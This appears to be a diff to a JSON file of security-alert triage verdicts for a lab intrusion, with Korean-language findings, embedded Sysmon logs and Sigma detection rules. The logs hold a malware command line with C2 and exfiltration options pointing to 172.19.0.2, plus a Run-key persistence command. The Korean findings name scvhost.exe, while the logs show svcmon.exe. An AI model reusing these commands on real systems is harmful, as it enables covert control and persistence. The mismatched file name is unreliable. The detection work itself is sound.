+            "id": "c6a504b65b801531473d70013636c6ad17aa6d516c80f694d395b673021e6367",
+            "timestamp": "2025-01-06T10:05:02.220Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:05:02.220\nProcessGuid: {416dd0c5-aace-677b-6e02-000000001100}\nProcessId: 8660\nImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=06D5FCE31C920DBF6B8E2C069C661020D269FD00,MD5=5651BB08D3D36263960E25E3969F73AD,SHA256=F572630D03AC493AB8BE3F756A4D55B9376DE155B37ADB2A98ADD51AE046A194,IMPHASH=0B5552DCCD9D0A834CEA55C0C8FC05BE\nParentProcessGuid: {416dd0c5-aabf-677b-6d02-000000001100}\nParentProcessId: 7328\nParentImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nParentCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nParentUser: BREACH\\client2",
+              "process.command_line": "C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html",
+              "process.entity_id": "{416dd0c5-aace-677b-6e02-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image",
+            "CommandLine"
+          ]
+        }
       ]
     },
     {
@@ -113,14 +678,108 @@
       "verdict": "true_positive",
       "alert_count": 1,
       "summary": "사용자 쓰기 경로의 의심 부모 프로세스가 명령 셸 실행",
-      "rules": ["User-Writable Parent Spawns Shell Or System Control Utility"],
-      "techniques": ["T1059.003"],
-      "findings": ["scvhost.exe가 cmd.exe를 자식 프로세스로 실행", "이전 다운로드·실행 사건과 동일 호스트 및 프로세스 계열", "정상 업무 행위로 설명하기 어려운 부모 경로"],
-      "limitations": ["셸을 통해 실행된 모든 후속 명령 미확인"],
-      "recommendations": ["명령 셸 자식 프로세스 조사", "동일 Entity ID 이벤트 보존", "침해 계정 세션 종료"],
+      "rules": [
+        "User-Writable Parent Spawns Shell Or System Control Utility"
+      ],
+      "techniques": [
+        "T1059.003"
+      ],
+      "findings": [
+        "scvhost.exe가 cmd.exe를 자식 프로세스로 실행",
+        "이전 다운로드·실행 사건과 동일 호스트 및 프로세스 계열",
+        "정상 업무 행위로 설명하기 어려운 부모 경로"
+      ],
+      "limitations": [
+        "셸을 통해 실행된 모든 후속 명령 미확인"
+      ],
+      "recommendations": [
+        "명령 셸 자식 프로세스 조사",
+        "동일 Entity ID 이벤트 보존",
+        "침해 계정 세션 종료"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T11:00:03.411Z", "event_code": "1", "title": "cmd.exe 실행", "detail": "사용자 경로의 의심 부모 프로세스에서 명령 셸 생성"},
-        {"timestamp": "2025-01-06T11:00:04.077Z", "event_code": "1", "title": "후속 명령", "detail": "시스템 구성 확인 명령 실행"}
+        {
+          "timestamp": "2025-01-06T11:00:03.411Z",
+          "event_code": "1",
+          "title": "cmd.exe 실행",
+          "detail": "사용자 경로의 의심 부모 프로세스에서 명령 셸 생성"
+        },
+        {
+          "timestamp": "2025-01-06T11:00:04.077Z",
+          "event_code": "1",
+          "title": "후속 명령",
+          "detail": "시스템 구성 확인 명령 실행"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-16ea215ba9facebb657632ae",
+          "as_of": "2025-01-06T11:00:05.662Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "e4c7ce60-bb0e-4055-a05f-b83444a7f203",
+            "title": "User-Writable Parent Spawns Shell Or System Control Utility",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_parent_path": {
+                "ParentImage|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_child": {
+                "Image|endswith": [
+                  "\\cmd.exe",
+                  "\\powershell.exe",
+                  "\\pwsh.exe",
+                  "\\reg.exe",
+                  "\\schtasks.exe",
+                  "\\sc.exe",
+                  "\\wscript.exe",
+                  "\\cscript.exe",
+                  "\\mshta.exe",
+                  "\\rundll32.exe",
+                  "\\regsvr32.exe"
+                ]
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "high",
+            "falsepositives": [
+              "Portable administration tools and software installers executing system utilities"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "879977321d68fe95a5d0eb9f0e3bbd32084401b419a7d3861c56ffde585906b5",
+            "timestamp": "2025-01-06T11:00:05.662Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 11:00:05.662\nProcessGuid: {416dd0c5-b7b5-677b-e702-000000001100}\nProcessId: 7704\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WSQtxiUDesrgQJ /t REG_SZ /d C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe /f\"\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {416dd0c5-aace-677b-6e02-000000001100}\nParentProcessId: 8660\nParentImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nParentCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nParentUser: BREACH\\client2",
+              "process.command_line": "C:\\Windows\\system32\\cmd.exe /c \"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WSQtxiUDesrgQJ /t REG_SZ /d C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe /f\"",
+              "process.entity_id": "{416dd0c5-b7b5-677b-e702-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "ParentImage",
+            "Image"
+          ]
+        }
       ]
     },
     {
@@ -133,16 +792,111 @@
       "verdict": "true_positive",
       "alert_count": 1,
       "summary": "의심 실행 파일을 가리키는 사용자 Run Key 지속성 등록 확인",
-      "rules": ["Registry Run Key Persistence Request"],
-      "techniques": ["T1060", "T1547.001"],
-      "findings": ["Run Key가 사용자 AppData의 scvhost.exe를 참조", "이전 실행·셸 사건과 동일 파일 경로", "로그온 시 자동 실행 가능한 지속성 구성"],
-      "limitations": ["재부팅 이후 자동 실행 성공 여부 미검증"],
-      "recommendations": ["해당 Run Key 제거", "지속성 항목 전체 점검", "의심 실행 파일 격리 및 해시 차단"],
+      "rules": [
+        "Registry Run Key Persistence Request"
+      ],
+      "techniques": [
+        "T1060",
+        "T1547.001"
+      ],
+      "findings": [
+        "Run Key가 사용자 AppData의 scvhost.exe를 참조",
+        "이전 실행·셸 사건과 동일 파일 경로",
+        "로그온 시 자동 실행 가능한 지속성 구성"
+      ],
+      "limitations": [
+        "재부팅 이후 자동 실행 성공 여부 미검증"
+      ],
+      "recommendations": [
+        "해당 Run Key 제거",
+        "지속성 항목 전체 점검",
+        "의심 실행 파일 격리 및 해시 차단"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T11:00:05.905Z", "event_code": "13", "title": "Registry 값 설정", "detail": "사용자 Run Key에 scvhost.exe 경로 등록"},
-        {"timestamp": "2025-01-06T11:00:06.311Z", "event_code": "12", "title": "Registry 객체 접근", "detail": "지속성 키 후속 접근"}
+        {
+          "timestamp": "2025-01-06T11:00:05.905Z",
+          "event_code": "13",
+          "title": "Registry 값 설정",
+          "detail": "사용자 Run Key에 scvhost.exe 경로 등록"
+        },
+        {
+          "timestamp": "2025-01-06T11:00:06.311Z",
+          "event_code": "12",
+          "title": "Registry 객체 접근",
+          "detail": "지속성 키 후속 접근"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-9d2ff70a9dbbe57faafa9e55",
+          "as_of": "2025-01-06T11:00:05.905Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "95ba873c-5bf3-4c13-9aeb-fe9ab1c832c8",
+            "title": "Registry Run Key Persistence Request",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_run_path": {
+                "CommandLine|contains": [
+                  "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                  "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                  "\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
+                ]
+              },
+              "selection_reg": {
+                "Image|endswith": "\\reg.exe",
+                "CommandLine|contains": [
+                  " add ",
+                  "add \"HK"
+                ]
+              },
+              "selection_powershell": {
+                "Image|endswith": [
+                  "\\powershell.exe",
+                  "\\pwsh.exe"
+                ],
+                "CommandLine|contains": [
+                  "Set-ItemProperty",
+                  "New-ItemProperty",
+                  "Set-Item"
+                ]
+              },
+              "condition": "selection_event and selection_run_path and (selection_reg or selection_powershell)"
+            },
+            "level": "medium",
+            "falsepositives": [
+              "Legitimate software configuring per-user startup"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "771a8d380b807ecb98558976421016778c59b495895106b524705c273f3008d4",
+            "timestamp": "2025-01-06T11:00:05.905Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 11:00:05.905\nProcessGuid: {416dd0c5-b7b5-677b-e902-000000001100}\nProcessId: 6632\nImage: C:\\Windows\\System32\\reg.exe\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\nDescription: Registry Console Tool\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: reg.exe\nCommandLine: reg  add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WSQtxiUDesrgQJ /t REG_SZ /d C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe /f\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC\nParentProcessGuid: {416dd0c5-b7b5-677b-e702-000000001100}\nParentProcessId: 7704\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WSQtxiUDesrgQJ /t REG_SZ /d C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe /f\"\nParentUser: BREACH\\client2",
+              "process.command_line": "reg  add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WSQtxiUDesrgQJ /t REG_SZ /d C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe /f",
+              "process.entity_id": "{416dd0c5-b7b5-677b-e902-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "CommandLine",
+            "Image"
+          ]
+        }
       ]
     }
   ]
 }
-
